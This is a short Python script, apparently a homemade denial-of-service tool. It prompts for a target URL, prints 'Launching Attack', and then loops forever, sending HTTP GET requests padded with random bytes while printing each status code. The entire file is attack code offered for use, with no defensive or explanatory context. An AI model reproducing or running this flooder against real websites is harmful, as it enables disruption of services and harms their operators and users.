import random
import requests

try:
    size = random.randint(10, 200)
    attack = random._urandom(size)
    url = input("URL> ")
    print(" ")
    print("Launching Attack")
    print(" ")
except ValueError:
    print(" ")
    exit("\033[1;34m Invalid Input: Please enter a valid number \033[1;m")
except KeyboardInterrupt:
    print(" ")
    exit("\033[1;34m [-]Canceled By User \033[1;m")

while True:
    try:
        response = requests.get(url, data=attack)
        print("Attacking sending bytes ===> Status Code:", response.status_code)
    except KeyboardInterrupt:
        print(" ")
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except requests.RequestException as e:
        print("Request failed:", e)
